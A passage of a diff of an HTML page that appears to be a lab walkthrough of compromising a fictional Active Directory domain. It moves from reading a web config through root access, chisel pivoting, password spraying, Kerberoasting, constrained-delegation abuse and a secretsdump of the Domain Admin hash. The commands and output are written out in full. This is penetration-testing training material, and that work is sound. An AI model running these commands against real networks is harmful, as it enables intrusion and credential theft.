+drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>js
+drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>php
+-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">   </span><span class="m">550</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">09</span>:53<span class="w"> </span>upload.php
+drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>www-data<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Dec<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">21</span>:15<span class="w"> </span>uploads
 </code></pre></div>
 <p><code>config.php</code> looks interesting. By viewing it is content, we will discover user <code>dev01</code> credentials. </p>
-<div class="highlight"><pre><span></span><code>www-data@web01:~/html$ cat config.php
-&lt;?php 
+<div class="highlight"><pre><span></span><code>www-data@web01:~/html$<span class="w"> </span>cat<span class="w"> </span>config.php
+&lt;?php<span class="w"> </span>
 <span class="nv">$config</span><span class="o">=</span>array<span class="o">(</span>
 <span class="s1">&#39;DB_HOST&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;localhost&#39;</span>,
 <span class="s1">&#39;DB_USERNAME&#39;</span><span class="o">=</span>&gt;<span class="s1">&#39;dev01&#39;</span>,
@@ -1331,35 +1398,35 @@ drwxr-xr-x <span class="m">2</span> www-data www-data  <span class="m">4096</spa
 ?&gt;
 </code></pre></div>
 <p>Let's verify the discovered credentials if they are valid. We can do this by switching to the user <code>dev01</code> using <code>su</code> command. </p>
-<div class="highlight"><pre><span></span><code>www-data@web01:~/html$ su dev01
-Password: 
-dev01@web01:/var/www/html$ id 
-<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>dev01<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>dev01<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>dev01<span class="o">)</span>
+<div class="highlight"><pre><span></span><code>www-data@web01:~/html$<span class="w"> </span>su<span class="w"> </span>dev01
+Password:<span class="w"> </span>
+dev01@web01:/var/www/html$<span class="w"> </span>id<span class="w"> </span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>dev01<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>dev01<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>dev01<span class="o">)</span>
 </code></pre></div>
 <h3 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h3>
 <p>In active directory PT, it is not necessary to gain root privileges in the Linux machines we can utilize that compromised Linux box to pivot into other machines in the same network. For learning purpose, we can try to escalate our privileges into root. First, checking the sudo rights of the current user. </p>
-<div class="highlight"><pre><span></span><code>dev01@web01:/var/www/html$ sudo -l 
-<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> dev01: 
-Matching Defaults entries <span class="k">for</span> dev01 on localhost:
-    env_reset, mail_badpass,
-    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+<div class="highlight"><pre><span></span><code>dev01@web01:/var/www/html$<span class="w"> </span>sudo<span class="w"> </span>-l<span class="w"> </span>
+<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>dev01:<span class="w"> </span>
+Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>dev01<span class="w"> </span>on<span class="w"> </span>localhost:
+<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,
+<span class="w">    </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
 
-User dev01 may run the following commands on localhost:
-    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+User<span class="w"> </span>dev01<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>localhost:
+<span class="w">    </span><span class="o">(</span>ALL<span class="w"> </span>:<span class="w"> </span>ALL<span class="o">)</span><span class="w"> </span>ALL
 </code></pre></div>
 <p>From the command output, we can identify that the user can run any commands with root privileges. We can abuse this by simply running the command <code>su</code> to switch to root. </p>
-<div class="highlight"><pre><span></span><code>dev01@web01:/var/www/html$ sudo su
-root@web01:/var/www/html# id
-<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+<div class="highlight"><pre><span></span><code>dev01@web01:/var/www/html$<span class="w"> </span>sudo<span class="w"> </span>su
+root@web01:/var/www/html#<span class="w"> </span>id
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
 </code></pre></div>
 <p>Now we are root. Checking root directory will reveal for us a log file that contain a password. </p>
-<div class="highlight"><pre><span></span><code>root@web01:~# ls
-auth.log  snap
-root@web01:~# cat auth.log
-Nov <span class="m">17</span> <span class="m">15</span>:08:39 localhost sshd<span class="o">[</span><span class="m">621893</span><span class="o">]</span>: Access from mail01
-Nov <span class="m">17</span> <span class="m">15</span>:08:39 localhost sshd<span class="o">[</span><span class="m">621893</span><span class="o">]</span>: Enter password:
-Nov <span class="m">17</span> <span class="m">15</span>:08:39 localhost sshd<span class="o">[</span><span class="m">621893</span><span class="o">]</span>: P@ssw0rd!
-Nov <span class="m">17</span> <span class="m">15</span>:09:12 localhost sshd<span class="o">[</span><span class="m">621893</span><span class="o">]</span>: Login successfull
+<div class="highlight"><pre><span></span><code>root@web01:~#<span class="w"> </span>ls
+auth.log<span class="w">  </span>snap
+root@web01:~#<span class="w"> </span>cat<span class="w"> </span>auth.log
+Nov<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">15</span>:08:39<span class="w"> </span>localhost<span class="w"> </span>sshd<span class="o">[</span><span class="m">621893</span><span class="o">]</span>:<span class="w"> </span>Access<span class="w"> </span>from<span class="w"> </span>mail01
+Nov<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">15</span>:08:39<span class="w"> </span>localhost<span class="w"> </span>sshd<span class="o">[</span><span class="m">621893</span><span class="o">]</span>:<span class="w"> </span>Enter<span class="w"> </span>password:
+Nov<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">15</span>:08:39<span class="w"> </span>localhost<span class="w"> </span>sshd<span class="o">[</span><span class="m">621893</span><span class="o">]</span>:<span class="w"> </span>P@ssw0rd!
+Nov<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">15</span>:09:12<span class="w"> </span>localhost<span class="w"> </span>sshd<span class="o">[</span><span class="m">621893</span><span class="o">]</span>:<span class="w"> </span>Login<span class="w"> </span>successfull
 </code></pre></div>
 <div class="admonition info">
 <p class="admonition-title">Info</p>
@@ -1368,14 +1435,14 @@ Nov <span class="m">17</span> <span class="m">15</span>:09:12 localhost sshd<spa
 <h2 id="mail01">Mail01<a class="headerlink" href="#mail01" title="Permanent link">&para;</a></h2>
 <h3 id="pivot-to-mail01">Pivot to Mail01<a class="headerlink" href="#pivot-to-mail01" title="Permanent link">&para;</a></h3>
 <p>The previously discover log file disclose the host <strong>Mail01</strong> in order to find it is IP address simply ping the host.</p>
-<div class="highlight"><pre><span></span><code>root@web01:~# ping -c <span class="m">3</span> mail01
-PING mail01.xtech.local <span class="o">(</span><span class="m">10</span>.10.10.10<span class="o">)</span> <span class="m">56</span><span class="o">(</span><span class="m">84</span><span class="o">)</span> bytes of data.
-<span class="m">64</span> bytes from mail01.xtech.local <span class="o">(</span><span class="m">10</span>.10.10.10<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">128</span> <span class="nv">time</span><span class="o">=</span><span class="m">0</span>.446 ms
-<span class="m">64</span> bytes from mail01.xtech.local <span class="o">(</span><span class="m">10</span>.10.10.10<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">2</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">128</span> <span class="nv">time</span><span class="o">=</span><span class="m">0</span>.345 ms
-<span class="m">64</span> bytes from mail01.xtech.local <span class="o">(</span><span class="m">10</span>.10.10.10<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">3</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">128</span> <span class="nv">time</span><span class="o">=</span><span class="m">0</span>.314 ms
+<div class="highlight"><pre><span></span><code>root@web01:~#<span class="w"> </span>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">3</span><span class="w"> </span>mail01
+PING<span class="w"> </span>mail01.xtech.local<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.10.10<span class="o">)</span><span class="w"> </span><span class="m">56</span><span class="o">(</span><span class="m">84</span><span class="o">)</span><span class="w"> </span>bytes<span class="w"> </span>of<span class="w"> </span>data.
+<span class="m">64</span><span class="w"> </span>bytes<span class="w"> </span>from<span class="w"> </span>mail01.xtech.local<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.10.10<span class="o">)</span>:<span class="w"> </span><span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="nv">ttl</span><span class="o">=</span><span class="m">128</span><span class="w"> </span><span class="nv">time</span><span class="o">=</span><span class="m">0</span>.446<span class="w"> </span>ms
+<span class="m">64</span><span class="w"> </span>bytes<span class="w"> </span>from<span class="w"> </span>mail01.xtech.local<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.10.10<span class="o">)</span>:<span class="w"> </span><span class="nv">icmp_seq</span><span class="o">=</span><span class="m">2</span><span class="w"> </span><span class="nv">ttl</span><span class="o">=</span><span class="m">128</span><span class="w"> </span><span class="nv">time</span><span class="o">=</span><span class="m">0</span>.345<span class="w"> </span>ms
+<span class="m">64</span><span class="w"> </span>bytes<span class="w"> </span>from<span class="w"> </span>mail01.xtech.local<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.10.10<span class="o">)</span>:<span class="w"> </span><span class="nv">icmp_seq</span><span class="o">=</span><span class="m">3</span><span class="w"> </span><span class="nv">ttl</span><span class="o">=</span><span class="m">128</span><span class="w"> </span><span class="nv">time</span><span class="o">=</span><span class="m">0</span>.314<span class="w"> </span>ms
 
---- mail01.xtech.local ping statistics ---
-<span class="m">3</span> packets transmitted, <span class="m">3</span> received, <span class="m">0</span>% packet loss, <span class="nb">time</span> 2023ms
+---<span class="w"> </span>mail01.xtech.local<span class="w"> </span>ping<span class="w"> </span>statistics<span class="w"> </span>---
+<span class="m">3</span><span class="w"> </span>packets<span class="w"> </span>transmitted,<span class="w"> </span><span class="m">3</span><span class="w"> </span>received,<span class="w"> </span><span class="m">0</span>%<span class="w"> </span>packet<span class="w"> </span>loss,<span class="w"> </span><span class="nb">time</span><span class="w"> </span>2023ms
 </code></pre></div>
 <p>We identified the IP address of <strong>Mail01</strong> host which is <code>10.10.10.10</code>. As we don't have access into the internal network (<code>10.0.0.0</code>) we will use <code>chisel</code> to pivot into the internal network. To utilize <code>chisel</code> we execute the following commands: </p>
 <ul>
@@ -1387,21 +1454,21 @@ PING mail01.xtech.local <span class="o">(</span><span class="m">10</span>.10.10.
 </li>
 </ul>
 <div class="highlight"><pre><span></span><code><span class="c1"># In local, machine open Python HTTP server</span>
-python3 -m http.server <span class="m">9002</span>
+python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">9002</span>
 <span class="c1"># In the target machine, download chisel</span>
-wget http://ip:9001/chisel
+wget<span class="w"> </span>http://ip:9001/chisel
 <span class="c1"># Also don&#39;t forget to make chisel binary executable</span>
-chmod +x chisel
+chmod<span class="w"> </span>+x<span class="w"> </span>chisel
 </code></pre></div>
 <ul>
 <li>Start <code>chisel</code> server in your local machine: </li>
 </ul>
-<div class="highlight"><pre><span></span><code>sudo chisel server -p <span class="m">9003</span> --reverse
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>chisel<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">9003</span><span class="w"> </span>--reverse
 </code></pre></div>
 <ul>
 <li>Run the client from the target machine. Use the flag <code>R:socks</code> to make use of Socks proxy: </li>
 </ul>
-<div class="highlight"><pre><span></span><code>./chisel client ip:9003 R:socks
+<div class="highlight"><pre><span></span><code>./chisel<span class="w"> </span>client<span class="w"> </span>ip:9003<span class="w"> </span>R:socks
 </code></pre></div>
 <p><img alt="" src="../osint_into_da.assets/image-20211223143134007.png" /></p>
 <h3 id="password-spray">Password Spray<a class="headerlink" href="#password-spray" title="Permanent link">&para;</a></h3>
@@ -1414,11 +1481,11 @@ chmod +x chisel
 <ul>
 <li>Make sure <code>proxychains</code> configuration file pointed to Socks5 proxy (<code>127.0.0.1:1080</code>).  The configuration file should be ending with the following line <code>socks5   127.0.0.1 1080</code> </li>
 </ul>
-<div class="highlight"><pre><span></span><code>tac /etc/proxychains.conf <span class="p">|</span> head -n <span class="m">1</span>
-socks5    <span class="m">127</span>.0.0.1 <span class="m">1080</span>
+<div class="highlight"><pre><span></span><code>tac<span class="w"> </span>/etc/proxychains.conf<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-n<span class="w"> </span><span class="m">1</span>
+socks5<span class="w">    </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">1080</span>
 </code></pre></div>
 <p>Now run <code>atomizer</code> with the following flags: </p>
-<div class="highlight"><pre><span></span><code>proxychains -q python3 atomizer.py owa <span class="s1">&#39;https://10.10.10.10/autodiscover/autodiscover.xml&#39;</span> <span class="s1">&#39;P@ssw0rd!&#39;</span> emails.txt
+<div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>-q<span class="w"> </span>python3<span class="w"> </span>atomizer.py<span class="w"> </span>owa<span class="w"> </span><span class="s1">&#39;https://10.10.10.10/autodiscover/autodiscover.xml&#39;</span><span class="w"> </span><span class="s1">&#39;P@ssw0rd!&#39;</span><span class="w"> </span>emails.txt
 </code></pre></div>
 <p><img alt="" src="../osint_into_da.assets/image-20211223152953726.png" /></p>
 <p>We found one valid credentials <strong>lonnie.hill</strong> with password <code>P@ssw0rd!</code>. Let's use it to login into his mailbox. </p>
@@ -1432,15 +1499,15 @@ socks5    <span class="m">127</span>.0.0.1 <span class="m">1080</span>
 <ul>
 <li>Windows:</li>
 </ul>
-<div class="highlight"><pre><span></span><code>runas /netonly /user:xtech.local<span class="se">\b</span>ob.baker cmd
+<div class="highlight"><pre><span></span><code>runas<span class="w"> </span>/netonly<span class="w"> </span>/user:xtech.local<span class="se">\b</span>ob.baker<span class="w"> </span>cmd
 P@ssw0rd@21
 
-.<span class="se">\b</span>loodhound.exe --collectionmethod all
+.<span class="se">\b</span>loodhound.exe<span class="w"> </span>--collectionmethod<span class="w"> </span>all
 </code></pre></div>
 <ul>
 <li>Linux: </li>
 </ul>
-<div class="highlight"><pre><span></span><code>bloodhound-python -c ALL -u bob.baker -p <span class="s1">&#39;P@ssw0rd@21&#39;</span> -d xtech.local -dc <span class="m">10</span>.10.10.10
+<div class="highlight"><pre><span></span><code>bloodhound-python<span class="w"> </span>-c<span class="w"> </span>ALL<span class="w"> </span>-u<span class="w"> </span>bob.baker<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;P@ssw0rd@21&#39;</span><span class="w"> </span>-d<span class="w"> </span>xtech.local<span class="w"> </span>-dc<span class="w"> </span><span class="m">10</span>.10.10.10
 </code></pre></div>
 <p>After collecting Domain Controller objects run BloodHound. Search for the user <strong>Bob.Baker</strong> and inspect his attributes.</p>
 <p><img alt="" src="../osint_into_da.assets/image-20211223160023416.png" /></p>
@@ -1462,19 +1529,19 @@ P@ssw0rd@21
 <ul>
 <li>First add SPN attribute to the service account ExchSVC: </li>
 </ul>
-<div class="highlight"><pre><span></span><code>proxychains python3 addspn.py <span class="m">10</span>.10.10.12 -u xtech.local<span class="se">\\</span>bob.baker -p <span class="s1">&#39;P@ssw0rd@21&#39;</span> -t exchsvc -s cifs/mail01.xtech.local  
+<div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>python3<span class="w"> </span>addspn.py<span class="w"> </span><span class="m">10</span>.10.10.12<span class="w"> </span>-u<span class="w"> </span>xtech.local<span class="se">\\</span>bob.baker<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;P@ssw0rd@21&#39;</span><span class="w"> </span>-t<span class="w"> </span>exchsvc<span class="w"> </span>-s<span class="w"> </span>cifs/mail01.xtech.local<span class="w">  </span>
 </code></pre></div>
 <ul>
 <li>Then request SPN account TGT: </li>
 </ul>
-<div class="highlight"><pre><span></span><code>proxychains impacket-GetUserSPNs xtech.local/bob.baker:<span class="s1">&#39;P@ssw0rd@21&#39;</span> -dc-ip <span class="m">10</span>.10.10.12 -request
+<div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>impacket-GetUserSPNs<span class="w"> </span>xtech.local/bob.baker:<span class="s1">&#39;P@ssw0rd@21&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.12<span class="w"> </span>-request
 </code></pre></div>
 <p><img alt="" src="../osint_into_da.assets/image-20211223163718738.png" /></p>
 <p><img alt="" src="../osint_into_da.assets/image-20211223163754911.png" /></p>
 <p>The following TGT will be retrieved: </p>
 <p><img alt="" src="../osint_into_da.assets/image-20211223163817942.png" /></p>
 <p>The retrieved TGT can be crack using <code>hashcat</code>, let's attempt to crack it using <code>fasttrack.txt</code> wordlist</p>
-<div class="highlight"><pre><span></span><code>hashcat -a <span class="m">0</span> -m <span class="m">13100</span> spn.txt /usr/share/wordlists/fasttrack.txt --force
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>spn.txt<span class="w"> </span>/usr/share/wordlists/fasttrack.txt<span class="w"> </span>--force
 </code></pre></div>
 <p><img alt="" src="../osint_into_da.assets/image-20211223164636380.png" /></p>
 <p>We obtained password for the service account <strong>ExchSVC</strong>. We discovered also he is a local admin in the host web01</p>
@@ -1493,26 +1560,26 @@ P@ssw0rd@21
 <p>By abusing constrained delegation privileges we can impersonate the Domain Admin to authenticate on the <strong>DC01</strong>, but first we have to know which service <strong>SQLSVC</strong> is allowed to delegate. This can be done either from <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">Powerview</a>'s <code>Get-NetUser</code> or from BloodHound.  </p>
 <p><img alt="" src="../osint_into_da.assets/image-20211226142625225.png" /></p>
 <p>So the account <strong>SQLSVC</strong> are allowed to delegate to the service <code>WWW/DC01</code>, we will use this service to impersonate the Domain Admin. Impacket contains a great tool called <code>getST</code> that can request a ticket. </p>
-<div class="highlight"><pre><span></span><code>proxychains impacket-getST  -impersonate administrator -spn WWW/dc01.xtech.local xtech.local/SQLSVC -hashes :5e76ca700abd3597ab702c0b52bacad2 -dc-ip <span class="m">10</span>.10.10.12 
-Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright <span class="m">2020</span> SecureAuth Corporation
+<div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>impacket-getST<span class="w">  </span>-impersonate<span class="w"> </span>administrator<span class="w"> </span>-spn<span class="w"> </span>WWW/dc01.xtech.local<span class="w"> </span>xtech.local/SQLSVC<span class="w"> </span>-hashes<span class="w"> </span>:5e76ca700abd3597ab702c0b52bacad2<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.12<span class="w"> </span>
+Impacket<span class="w"> </span>v0.9.23.dev1+20210315.121412.a16198c3<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2020</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
 
-<span class="o">[</span>*<span class="o">]</span> Getting TGT <span class="k">for</span> user
-<span class="o">[</span>*<span class="o">]</span> Impersonating Administrator
-<span class="o">[</span>*<span class="o">]</span>     Requesting S4U2self
-<span class="o">[</span>*<span class="o">]</span>     Requesting S4U2Proxy
-<span class="o">[</span>*<span class="o">]</span> Saving ticket <span class="k">in</span> Administrator.ccache
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Getting<span class="w"> </span>TGT<span class="w"> </span><span class="k">for</span><span class="w"> </span>user
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Impersonating<span class="w"> </span>Administrator
+<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>Requesting<span class="w"> </span>S4U2self
+<span class="o">[</span>*<span class="o">]</span><span class="w">     </span>Requesting<span class="w"> </span>S4U2Proxy
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>ticket<span class="w"> </span><span class="k">in</span><span class="w"> </span>Administrator.ccache
 </code></pre></div>
 <p>Then, we will store the TGT into the variable <code>KRB5CCNAME</code>. </p>
-<div class="highlight"><pre><span></span><code><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
 </code></pre></div>
 <p>Finally, let's dump the Domain Admin NTLM hash using <code>Secretdump</code>  </p>
-<div class="highlight"><pre><span></span><code>proxychains -q impacket-secretsdump -k -no-pass dc01.xtech.local  -just-dc-user administrator  
-Impacket v0.9.24 - Copyright <span class="m">2021</span> SecureAuth Corporation
+<div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>-q<span class="w"> </span>impacket-secretsdump<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>dc01.xtech.local<span class="w">  </span>-just-dc-user<span class="w"> </span>administrator<span class="w">  </span>
+Impacket<span class="w"> </span>v0.9.24<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2021</span><span class="w"> </span>SecureAuth<span class="w"> </span>Corporation
 
-<span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
-<span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Dumping<span class="w"> </span>Domain<span class="w"> </span>Credentials<span class="w"> </span><span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>the<span class="w"> </span>DRSUAPI<span class="w"> </span>method<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>NTDS.DIT<span class="w"> </span>secrets
 xtech.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:f7b8c850b103fd71e2d60fbe19d1e373:::
-<span class="o">[</span>*<span class="o">]</span> Cleaning up... 
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Cleaning<span class="w"> </span>up...<span class="w"> </span>
 </code></pre></div>
 <p>The attack works, we have impersonated the Domain Admin and dump it is NTLM hash now we have access into the xtech network. </p>
 <p><img alt="" src="../osint_into_da.assets/image-20211226141754470.png" /></p>
@@ -1528,102 +1595,64 @@ xtech.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b5
 <li><a href="https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html">https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html</a></li>
 <li><a href="https://book.hacktricks.xyz/windows/active-directory-methodology">https://book.hacktricks.xyz/windows/active-directory-methodology</a></li>
 </ol>
-                
-                  
-                
-              
-              
-                
 
 
-              
-            </article>
-          </div>
+
+
+
+                
+              </article>
+            </div>
+          
+          
         </div>
         
       </main>
       
-        
-<footer class="md-footer">
-  
-    <nav class="md-footer__inner md-grid" aria-label="Footer">
-      
-        
-        <a href="../basic_av_evasion/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Basic Anti-Virus Evasion" rel="prev">
-          <div class="md-footer__button md-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-          </div>
-          <div class="md-footer__title">
-            <div class="md-ellipsis">
-              <span class="md-footer__direction">
-                Previous
-              </span>
-              Basic Anti-Virus Evasion
-            </div>
-          </div>
-        </a>
-      
-      
-        
-        <a href="../../Writeups/" class="md-footer__link md-footer__link--next" aria-label="Next: Overview" rel="next">
-          <div class="md-footer__title">
-            <div class="md-ellipsis">
-              <span class="md-footer__direction">
-                Next
-              </span>
-              Overview
-            </div>
-          </div>
-          <div class="md-footer__button md-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
-          </div>
-        </a>
-      
-    </nav>
+        <footer class="md-footer">
   
   <div class="md-footer-meta md-typeset">
     <div class="md-footer-meta__inner md-grid">
-      <div class="md-footer-copyright">
-        
-          <div class="md-footer-copyright__highlight">
-            Mohammed Al Kalbani. &copy; 2022
-          </div>
-        
-        
-        
-      </div>
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Mohammed Al Kalbani. &copy; 2022
+    </div>
+  
+  
+</div>
       
-  <div class="md-footer-social">
+        <div class="md-social">
+  
+    
     
       
       
-        
-        
-      
-      <a href="https://kf0k.github.io" target="_blank" rel="noopener" title="kf0k.github.io" class="md-footer-social__link">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
-      </a>
+    
+    <a href="https://kf0k.github.io" target="_blank" rel="noopener" title="kf0k.github.io" class="md-social__link">
